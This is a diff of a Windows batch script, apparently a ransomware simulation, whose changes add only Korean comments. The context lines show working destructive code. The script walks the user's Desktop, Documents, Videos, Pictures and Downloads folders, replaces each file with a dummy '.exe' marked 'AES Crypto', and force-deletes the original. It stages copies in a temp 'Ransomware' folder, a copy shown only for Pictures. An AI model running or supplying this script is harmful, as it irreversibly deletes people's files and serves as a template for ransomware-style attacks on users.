@@ -1,6 +1,7 @@
 @echo off
 chcp 65001
 
+:: Ransomware 폴더가 있을 경우만 제거
 if exist "%temp%\Ransomware" (
 	rd /s /q "%temp%\Ransomware"
 )
@@ -20,6 +21,7 @@ copy "%userprofile%\Pictures\*.*" "%temp%\Ransomware\pic" >nul 2>&1
 :: Desktop 폴더 파일 처리
 cd "%userprofile%\Desktop"
 For /F "tokens=*" %%i in ('dir /b /s /a-h /a-d') do (
+    :: desktop.ini와 자기 자신 제외
     if /I not "%%~nxi"=="desktop.ini" if /I not "%%~fi"=="%~f0" (
         echo AES Crypto>"%%i.exe"
         Del /f /q "%%i"
@@ -29,6 +31,7 @@ For /F "tokens=*" %%i in ('dir /b /s /a-h /a-d') do (
 :: Documents 폴더 파일 처리
 cd "%userprofile%\Documents"
 For /F "tokens=*" %%a in ('dir /b /s /a-h /a-d') do (
+    :: desktop.ini와 자기 자신 제외
 	if /I not "%%~nxa"=="desktop.ini" if /I not "%%~fa"=="%~f0" (
 		echo AES Crypto>"%%a.exe"
         	Del /f /q "%%a"
@@ -38,6 +41,7 @@ For /F "tokens=*" %%a in ('dir /b /s /a-h /a-d') do (
 :: Videos 폴더 파일 처리
 cd "%userprofile%\Videos"
 For /F "tokens=*" %%l in ('dir /b /s /a-h /a-d') do (
+    :: desktop.ini와 자기 자신 제외
     if /I not "%%~nxl"=="desktop.ini" if /I not "%%~fl"=="%~f0" (
         echo AES Crypto>"%%l.exe"
         Del /f /q "%%l"
@@ -47,6 +51,7 @@ For /F "tokens=*" %%l in ('dir /b /s /a-h /a-d') do (
 :: Pictures 폴더 파일 처리
 cd "%userprofile%\Pictures"
 For /F "tokens=*" %%j in ('dir /b /s /a-h /a-d') do (
+    :: desktop.ini와 자기 자신 제외
     if /I not "%%~nxj"=="desktop.ini" if /I not "%%~fj"=="%~f0" (
         echo AES Crypto>"%%j.exe"
         Del /f /q "%%j"
@@ -56,6 +61,7 @@ For /F "tokens=*" %%j in ('dir /b /s /a-h /a-d') do (
 :: Downloads 폴더 파일 처리
 cd "%userprofile%\Downloads"
 For /F "tokens=*" %%k in ('dir /b /s /a-h /a-d') do (
+    :: desktop.ini와 자기 자신 제외
 	if /I not "%%~nxk"=="desktop.ini" if /I not "%%~fk"=="%~f0" (	
 		echo AES Crypto>"%%k.exe"
 		Del /f /q "%%k"
